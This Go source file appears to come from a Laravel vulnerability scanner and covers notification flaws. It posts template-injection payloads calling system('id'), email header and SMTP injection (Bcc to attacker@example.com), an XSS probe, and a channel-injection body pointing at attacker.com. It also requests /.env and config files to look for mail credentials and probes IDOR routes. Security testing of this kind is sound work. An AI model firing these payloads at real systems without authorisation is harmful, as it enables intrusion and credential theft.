package vulnerabilities

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"laravelmap/internal/common"
	"laravelmap/pkg/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// NotificationVulnerabilitiesScanner is a struct that contains an HTTP client for detecting Laravel notification vulnerabilities
type NotificationVulnerabilitiesScanner struct {
	client *httpclient.Client
}

// NewNotificationVulnerabilitiesScanner initializes and returns a new NotificationVulnerabilitiesScanner instance
func NewNotificationVulnerabilitiesScanner() *NotificationVulnerabilitiesScanner {
	return &NotificationVulnerabilitiesScanner{
		client: httpclient.NewClient(15 * time.Second),
	}
}

// Run checks for Laravel notification vulnerabilities
func (nvs *NotificationVulnerabilitiesScanner) Run(target string) []common.ScanResult {
	var results []common.ScanResult

	// Check for email template injection vulnerabilities
	emailResults := nvs.checkEmailTemplateInjection(target)
	results = append(results, emailResults...)

	// Check for notification channel security issues
	channelResults := nvs.checkNotificationChannelSecurity(target)
	results = append(results, channelResults...)

	// Check for notification configuration exposure
	configResults := nvs.checkNotificationConfigExposure(target)
	results = append(results, configResults...)

	// Check for notification route vulnerabilities
	routeResults := nvs.checkNotificationRouteVulnerabilities(target)
	results = append(results, routeResults...)

	// If no vulnerabilities were detected
	if len(results) == 0 {
		results = append(results, common.ScanResult{
			ScanName:    nvs.Name(),
			Category:    "Vulnerabilities",
			Description: "No Laravel notification vulnerabilities detected",
			Path:        target,
			StatusCode:  0,
			Detail:      "No potential Laravel notification vulnerabilities were detected. However, this does not guarantee that the application is not vulnerable to notification-related attacks.",
		})
	}

	return results
}

// checkEmailTemplateInjection checks for email template injection vulnerabilities
func (nvs *NotificationVulnerabilitiesScanner) checkEmailTemplateInjection(target string) []common.ScanResult {
	var results []common.ScanResult

	// Find forms with email fields
	forms := nvs.findFormsWithEmailFields(target)

	// Prepare email template injection payloads
	injectionPayloads := []struct {
		name  string
		value string
	}{
		{
			name:  "Blade Injection",
			value: "test@example.com@{!! system('id') !!}",
		},
		{
			name:  "Template Variable Injection",
			value: "{{ system('id') }}@example.com",
		},
		{
			name:  "Email Header Injection",
			value: "test@example.com%0d%0aBcc: attacker@example.com",
		},
		{
			name:  "SMTP Command Injection",
			value: "test@example.com%0d%0aDATA%0d%0aSubject: Hacked%0d%0a%0d%0aThis is a test.",
		},
		{
			name:  "HTML/JavaScript Injection",
			value: "test+<script>alert(1)</script>@example.com",
		},
	}

	// Test each form with email fields
	for _, form := range forms {
		// Only test POST forms
		if form.method != "POST" {
			continue
		}

		// Test each payload
		for _, payload := range injectionPayloads {
			// Create a copy of params with the payload in email fields
			paramsWithPayload := make(map[string]string)
			for name, value := range form.params {
				if nvs.isEmailField(name) {
					paramsWithPayload[name] = payload.value
				} else {
					paramsWithPayload[name] = value
				}
			}

			// Create form data
			formData := url.Values{}
			for name, value := range paramsWithPayload {
				formData.Set(name, value)
			}

			// Send POST request
			headers := map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			}
			resp, err := nvs.client.Post(form.action, headers, strings.NewReader(formData.Encode()))
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response indicates a successful submission
			if resp.StatusCode == 200 || resp.StatusCode == 302 {
				// Check for success indicators
				if nvs.checkFormSubmissionSuccess(bodyString) {
					results = append(results, common.ScanResult{
						ScanName:    nvs.Name(),
						Category:    "Vulnerabilities",
						Description: fmt.Sprintf("Potential Laravel email template injection vulnerability (%s)", payload.name),
						Path:        form.action,
						StatusCode:  resp.StatusCode,
						Detail:      fmt.Sprintf("The form at %s might be vulnerable to email template injection. The application accepted a potentially malicious email payload that could lead to template injection in email notifications.", form.action),
					})

					// Break the loop for this form to avoid duplicate results
					break
				}
			}
		}
	}

	return results
}

// isEmailField checks if a field name is likely to be an email field
func (nvs *NotificationVulnerabilitiesScanner) isEmailField(fieldName string) bool {
	emailFieldPatterns := []string{
		"email",
		"mail",
		"e-mail",
		"e_mail",
		"recipient",
		"to",
		"from",
		"sender",
		"contact",
	}

	fieldNameLower := strings.ToLower(fieldName)
	for _, pattern := range emailFieldPatterns {
		if strings.Contains(fieldNameLower, pattern) {
			return true
		}
	}

	return false
}

// findFormsWithEmailFields finds forms with email fields in the target application
func (nvs *NotificationVulnerabilitiesScanner) findFormsWithEmailFields(target string) []form {
	var forms []form

	// Send a GET request to the target
	resp, err := nvs.client.Get(target, nil)
	if err != nil {
		return forms
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return forms
	}
	bodyString := string(bodyBytes)

	// Find all forms
	formPattern := `<form[^>]*action="([^"]*)"[^>]*method="([^"]*)"[^>]*>(.*?)</form>`
	formRegex := regexp.MustCompile(formPattern)
	formMatches := formRegex.FindAllStringSubmatch(bodyString, -1)

	for _, formMatch := range formMatches {
		if len(formMatch) < 4 {
			continue
		}

		action := formMatch[1]
		method := strings.ToUpper(formMatch[2])
		formContent := formMatch[3]

		// If action is relative, make it absolute
		if !strings.HasPrefix(action, "http") {
			parsedURL, parseErr := url.Parse(target)
			if parseErr != nil {
				continue
			}

			if strings.HasPrefix(action, "/") {
				// Absolute path
				parsedURL.Path = action
			} else {
				// Relative path
				if !strings.HasSuffix(parsedURL.Path, "/") {
					parsedURL.Path += "/"
				}
				parsedURL.Path += action
			}

			action = parsedURL.String()
		}

		// Find all input fields
		params := make(map[string]string)
		inputPattern := `<input[^>]*name="([^"]*)"[^>]*>`
		inputRegex := regexp.MustCompile(inputPattern)
		inputMatches := inputRegex.FindAllStringSubmatch(formContent, -1)

		hasEmailField := false
		for _, inputMatch := range inputMatches {
			if len(inputMatch) < 2 {
				continue
			}

			name := inputMatch[1]
			params[name] = ""

			// Check if this is an email field
			if nvs.isEmailField(name) {
				hasEmailField = true
			}
		}

		// Find all textarea fields
		textareaPattern := `<textarea[^>]*name="([^"]*)"[^>]*>`
		textareaRegex := regexp.MustCompile(textareaPattern)
		textareaMatches := textareaRegex.FindAllStringSubmatch(formContent, -1)

		for _, textareaMatch := range textareaMatches {
			if len(textareaMatch) < 2 {
				continue
			}

			name := textareaMatch[1]
			params[name] = ""

			// Check if this is an email field
			if nvs.isEmailField(name) {
				hasEmailField = true
			}
		}

		// Only add forms with email fields
		if hasEmailField {
			forms = append(forms, form{
				action: action,
				method: method,
				params: params,
			})
		}
	}

	return forms
}

type form struct {
	action string
	method string
	params map[string]string
}

// checkFormSubmissionSuccess checks if the response indicates a successful form submission
func (nvs *NotificationVulnerabilitiesScanner) checkFormSubmissionSuccess(response string) bool {
	// Check for common success indicators
	successPatterns := []string{
		"success",
		"thank you",
		"submitted",
		"sent",
		"received",
		"message has been",
		"email has been",
		"notification has been",
		"we'll get back to you",
		"we will get back to you",
	}

	for _, pattern := range successPatterns {
		if strings.Contains(strings.ToLower(response), strings.ToLower(pattern)) {
			return true
		}
	}

	return false
}

// checkNotificationChannelSecurity checks for notification channel security issues
func (nvs *NotificationVulnerabilitiesScanner) checkNotificationChannelSecurity(target string) []common.ScanResult {
	var results []common.ScanResult

	// Common notification channel endpoints
	channelEndpoints := []string{
		"/notifications",
		"/api/notifications",
		"/user/notifications",
		"/api/user/notifications",
		"/notification/send",
		"/api/notification/send",
		"/notification/broadcast",
		"/api/notification/broadcast",
	}

	// Test each notification channel endpoint
	for _, endpoint := range channelEndpoints {
		// Create the full URL
		parsedURL, parseErr := url.Parse(target)
		if parseErr != nil {
			continue
		}

		parsedURL.Path = endpoint
		fullURL := parsedURL.String()

		// Test for unauthorized access to notifications
		unauthorizedResults := nvs.checkUnauthorizedNotificationAccess(fullURL)
		results = append(results, unauthorizedResults...)

		// Test for notification channel injection
		injectionResults := nvs.checkNotificationChannelInjection(fullURL)
		results = append(results, injectionResults...)
	}

	return results
}

// checkUnauthorizedNotificationAccess checks for unauthorized access to notifications
func (nvs *NotificationVulnerabilitiesScanner) checkUnauthorizedNotificationAccess(notificationURL string) []common.ScanResult {
	var results []common.ScanResult

	// Send GET request without authentication
	resp, err := nvs.client.Get(notificationURL, nil)
	if err != nil {
		return results
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return results
	}
	bodyString := string(bodyBytes)

	// Check if the response contains notification data
	if resp.StatusCode == 200 && nvs.containsNotificationData(bodyString) {
		results = append(results, common.ScanResult{
			ScanName:    nvs.Name(),
			Category:    "Vulnerabilities",
			Description: "Unauthorized access to Laravel notifications",
			Path:        notificationURL,
			StatusCode:  resp.StatusCode,
			Detail:      fmt.Sprintf("The notification endpoint %s allows unauthorized access to notifications. This could expose sensitive information contained in notifications to unauthenticated users.", notificationURL),
		})
	}

	return results
}

// containsNotificationData checks if the response contains notification data
func (nvs *NotificationVulnerabilitiesScanner) containsNotificationData(response string) bool {
	// Check for common notification data patterns
	notificationPatterns := []string{
		"\"notifications\":",
		"\"notification\":",
		"\"type\":",
		"\"notifiable_type\":",
		"\"notifiable_id\":",
		"\"data\":",
		"\"read_at\":",
		"\"created_at\":",
		"\"updated_at\":",
		"\"id\":",
		"\"message\":",
		"\"subject\":",
		"\"body\":",
		"\"unread\":",
		"\"read\":",
	}

	for _, pattern := range notificationPatterns {
		if strings.Contains(response, pattern) {
			return true
		}
	}

	// Check if the response is a JSON array or object with notification data
	if strings.HasPrefix(strings.TrimSpace(response), "[") || strings.HasPrefix(strings.TrimSpace(response), "{") {
		// Try to parse as JSON array
		var jsonArray []map[string]interface{}
		if err := json.Unmarshal([]byte(response), &jsonArray); err == nil && len(jsonArray) > 0 {
			// Check first item for notification keys
			for _, item := range jsonArray {
				for _, pattern := range []string{"notification", "type", "data", "read_at", "message"} {
					for key := range item {
						if strings.Contains(strings.ToLower(key), pattern) {
							return true
						}
					}
				}
			}
		}

		// Try to parse as JSON object
		var jsonObject map[string]interface{}
		if err := json.Unmarshal([]byte(response), &jsonObject); err == nil {
			// Check for notification keys
			for _, pattern := range []string{"notification", "type", "data", "read_at", "message"} {
				for key := range jsonObject {
					if strings.Contains(strings.ToLower(key), pattern) {
						return true
					}
				}
			}
		}
	}

	return false
}

// checkNotificationChannelInjection checks for notification channel injection vulnerabilities
func (nvs *NotificationVulnerabilitiesScanner) checkNotificationChannelInjection(notificationURL string) []common.ScanResult {
	var results []common.ScanResult

	// Prepare notification channel injection payloads
	injectionPayloads := []struct {
		name  string
		value string
	}{
		{
			name:  "Channel Override",
			value: `{"channel":"admin","message":"Test message"}`,
		},
		{
			name:  "Multiple Channel Injection",
			value: `{"channels":["mail","database","broadcast","slack"],"message":"Test message"}`,
		},
		{
			name:  "Slack Webhook Injection",
			value: `{"channel":"slack","url":"https://attacker.com/webhook","message":"Test message"}`,
		},
		{
			name:  "SMS Gateway Injection",
			value: `{"channel":"nexmo","to":"1234567890","message":"Test message"}`,
		},
	}

	// Test each payload
	for _, payload := range injectionPayloads {
		// Send POST request with JSON payload
		headers := map[string]string{
			"Content-Type": "application/json",
			"Accept":       "application/json",
		}
		resp, err := nvs.client.Post(notificationURL, headers, strings.NewReader(payload.value))
		if err != nil {
			continue
		}

		bodyBytes, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyString := string(bodyBytes)

		// Check if the response indicates a successful notification
		if nvs.checkNotificationSuccess(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    nvs.Name(),
				Category:    "Vulnerabilities",
				Description: fmt.Sprintf("Potential Laravel notification channel injection vulnerability (%s)", payload.name),
				Path:        notificationURL,
				StatusCode:  resp.StatusCode,
				Detail:      fmt.Sprintf("The notification endpoint %s might be vulnerable to channel injection. The application accepted a potentially malicious channel configuration that could lead to unauthorized notification delivery or information disclosure.", notificationURL),
			})

			// Break the loop to avoid duplicate results
			break
		}
	}

	return results
}

// checkNotificationSuccess checks if the response indicates a successful notification
func (nvs *NotificationVulnerabilitiesScanner) checkNotificationSuccess(response string) bool {
	// Check for common success indicators
	successPatterns := []string{
		"notification sent",
		"notification has been sent",
		"successfully sent",
		"successfully delivered",
		"notification created",
		"notification has been created",
		"message sent",
		"message has been sent",
		"\"success\"",
		"\"status\":\"success\"",
		"\"status\":\"ok\"",
	}

	for _, pattern := range successPatterns {
		if strings.Contains(strings.ToLower(response), strings.ToLower(pattern)) {
			return true
		}
	}

	// Check if the response is a JSON object with success indicators
	var jsonResponse map[string]interface{}
	if err := json.Unmarshal([]byte(response), &jsonResponse); err == nil {
		// Check for success status
		if status, ok := jsonResponse["status"]; ok {
			if statusStr, ok := status.(string); ok {
				if statusStr == "success" || statusStr == "ok" {
					return true
				}
			}
		}

		// Check for notification ID
		if _, ok := jsonResponse["notification_id"]; ok {
			return true
		}

		// Check for message ID
		if _, ok := jsonResponse["message_id"]; ok {
			return true
		}
	}

	return false
}

// checkNotificationConfigExposure checks for notification configuration exposure
func (nvs *NotificationVulnerabilitiesScanner) checkNotificationConfigExposure(target string) []common.ScanResult {
	var results []common.ScanResult

	// Common paths that might expose notification configuration
	configPaths := []string{
		"/config/mail.php",
		"/app/config/mail.php",
		"/config/services.php",
		"/app/config/services.php",
		"/storage/logs/laravel.log",
		"/.env",
	}

	for _, path := range configPaths {
		// Create the full URL
		parsedURL, parseErr := url.Parse(target)
		if parseErr != nil {
			continue
		}

		parsedURL.Path = path
		fullURL := parsedURL.String()

		// Send GET request
		resp, err := nvs.client.Get(fullURL, nil)
		if err != nil {
			continue
		}

		bodyBytes, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyString := string(bodyBytes)

		// Check if the response contains notification configuration information
		if resp.StatusCode == 200 && nvs.containsNotificationConfig(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    nvs.Name(),
				Category:    "Vulnerabilities",
				Description: "Laravel notification configuration exposure",
				Path:        fullURL,
				StatusCode:  resp.StatusCode,
				Detail:      fmt.Sprintf("The application exposes notification configuration at %s. This could reveal sensitive information such as mail server credentials, API keys for notification services, and other notification channel configurations.", fullURL),
			})
		}
	}

	return results
}

// containsNotificationConfig checks if the response contains notification configuration information
func (nvs *NotificationVulnerabilitiesScanner) containsNotificationConfig(response string) bool {
	notificationConfigPatterns := []string{
		"MAIL_HOST",
		"MAIL_PORT",
		"MAIL_USERNAME",
		"MAIL_PASSWORD",
		"MAIL_ENCRYPTION",
		"MAIL_FROM_ADDRESS",
		"MAIL_FROM_NAME",
		"MAILGUN_DOMAIN",
		"MAILGUN_SECRET",
		"MAILGUN_ENDPOINT",
		"POSTMARK_TOKEN",
		"SES_KEY",
		"SES_SECRET",
		"SES_REGION",
		"SLACK_WEBHOOK_URL",
		"NEXMO_KEY",
		"NEXMO_SECRET",
		"NEXMO_SMS_FROM",
		"host =>",
		"port =>",
		"username =>",
		"password =>",
		"encryption =>",
		"from =>",
		"'host' =>",
		"'port' =>",
		"'username' =>",
		"'password' =>",
		"'encryption' =>",
		"'from' =>",
	}

	for _, pattern := range notificationConfigPatterns {
		if strings.Contains(response, pattern) {
			return true
		}
	}

	return false
}

// checkNotificationRouteVulnerabilities checks for notification route vulnerabilities
func (nvs *NotificationVulnerabilitiesScanner) checkNotificationRouteVulnerabilities(target string) []common.ScanResult {
	var results []common.ScanResult

	// Common notification route patterns
	routePatterns := []string{
		"/notification/%d",
		"/notifications/%d",
		"/api/notification/%d",
		"/api/notifications/%d",
		"/user/notification/%d",
		"/user/notifications/%d",
		"/api/user/notification/%d",
		"/api/user/notifications/%d",
	}

	// Test each route pattern with different IDs
	for _, pattern := range routePatterns {
		for id := 1; id <= 5; id++ {
			// Create the full URL
			route := fmt.Sprintf(pattern, id)
			parsedURL, parseErr := url.Parse(target)
			if parseErr != nil {
				continue
			}

			parsedURL.Path = route
			fullURL := parsedURL.String()

			// Send GET request
			resp, err := nvs.client.Get(fullURL, nil)
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response contains notification data
			if resp.StatusCode == 200 && nvs.containsNotificationData(bodyString) {
				results = append(results, common.ScanResult{
					ScanName:    nvs.Name(),
					Category:    "Vulnerabilities",
					Description: "Insecure direct object reference (IDOR) in Laravel notifications",
					Path:        fullURL,
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("The notification route %s allows access to notifications by ID without proper authorization checks. This could allow attackers to access notifications belonging to other users.", fullURL),
				})

				// Break the loop to avoid duplicate results
				break
			}
		}
	}

	return results
}

// Name returns the name of the scanner
func (nvs *NotificationVulnerabilitiesScanner) Name() string {
	return "Laravel Notification Vulnerabilities Scanner"
}
